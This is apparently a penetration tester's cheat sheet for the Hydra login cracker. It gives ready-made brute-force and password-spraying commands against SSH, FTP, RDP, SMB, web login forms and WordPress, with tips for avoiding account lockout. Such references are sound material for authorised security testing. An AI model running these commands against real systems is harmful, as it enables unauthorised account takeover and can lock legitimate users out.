+++
title = "Hydra"
+++

- https://hydra.cc/docs/intro/

Hydra is a parallelized login cracker that supports numerous protocols to attack. It is very fast and flexible, and new modules are easy to add.

## Core Flags

```bash
-f      : Stop immediately when a credential is found
-V      : Verbose (Check if service is responding)
-t <N>  : Number of parallel tasks (threads)
-l <USER> : Single username
-L <USER_LIST> : Username list file
-p <PASSWORD> : Single password
-P <WORDLIST> : Password wordlist file
-o <OUTPUT> : Output file
```

## Protocol-Specific Examples

### SSH / FTP / RDP / SMB

```bash
# SSH brute-force; -t 4 is recommended for SSH (ONLINE - use small wordlist)
hydra -t 4 -l <USER> -P /usr/share/seclists/Passwords/Common-Credentials/10-million-password-list-top-1000.txt ssh://<TARGET>:<PORT> -f -V -o hydra_ssh_login.txt

# FTP brute-force
hydra -l <USER> -P <WORDLIST> -f -V ftp://<TARGET>

# RDP brute-force
hydra -l <USER> -P <WORDLIST> -f -V rdp://<TARGET>

# SMB brute-force
hydra -l <USER> -P <WORDLIST> -f -V smb://<TARGET>
```

## Web Forms (HTTP-POST)

**Syntax:** `"/path:body:F=FailureString"`
- Use `^USER^` and `^PASS^` as placeholders
- Check Burp Suite for body structure
- `F=FailureString` specifies the failure response text to detect failed logins

```bash
# Web Login brute-force (ONLINE - use small wordlist to avoid lockouts)
hydra -t 16 -l <USER> -P /usr/share/seclists/Passwords/Common-Credentials/10-million-password-list-top-1000.txt <TARGET> http-post-form "/login:username=^USER^&password=^PASS^:F=incorrect" -VF -o hydra_web_login.txt

# Generic web form
hydra -l <USER> -P <WORDLIST> <TARGET> http-post-form "/login.php:user=^USER^&pass=^PASS^:F=Invalid password" -V -f
```

### WordPress Specific

```bash
# WordPress brute-force login form with a complex request string (ONLINE - use small wordlist)
hydra -t 16 -l <USER> -P /usr/share/seclists/Passwords/Common-Credentials/10-million-password-list-top-1000.txt <TARGET> http-post-form '/wp-login.php:log=^USER^&pwd=^PASS^:F=Invalid username' -VF -o hydra_wp_login.txt

# Alternative WordPress syntax
hydra -l <USER> -P <WORDLIST> <TARGET> http-post-form "/wp-login.php:log=^USER^&pwd=^PASS^&wp-submit=Log+In:F=Invalid username" -V -f
```

## Password Spraying

Password spraying uses one password against many users (alternates users), which has **no risk of account lockout** compared to brute-forcing. This is useful as a "hail Mary" to find any way in!

**Best practice**: Obtain account lockout policy beforehand (via enumeration or asking customer); if you don't know the password policy, a good rule of thumb is to wait a few hours between attempts, which should be long enough for the account lockout threshold to reset.

```bash
# SSH password spraying (1 password vs many users)
hydra -L <USER_LIST> -p '<PASSWORD>' -f -V -t 4 ssh://<TARGET>

# Web form password spraying
hydra -L <USER_LIST> -p '<PASSWORD>' -f -V <TARGET> http-post-form "/login:user=^USER^&pass=^PASS^:F=Invalid"
```

## Important Notes

- **Account Lockout Risk**: Brute-forcing (many passwords vs 1 user) has a **RISK of account lockout** due to account lockout policy. Use small wordlists and be cautious.
- **Thread Count**: Use `-t 4` for SSH to avoid overwhelming the service. Web forms can handle higher thread counts like `-t 16`.
- **Wordlist Selection**: For online attacks, use small wordlists (e.g., top 1000 passwords) to minimize lockout risk and reduce time.
- **Output**: Always use `-o <OUTPUT_FILE>` to save results for later analysis.
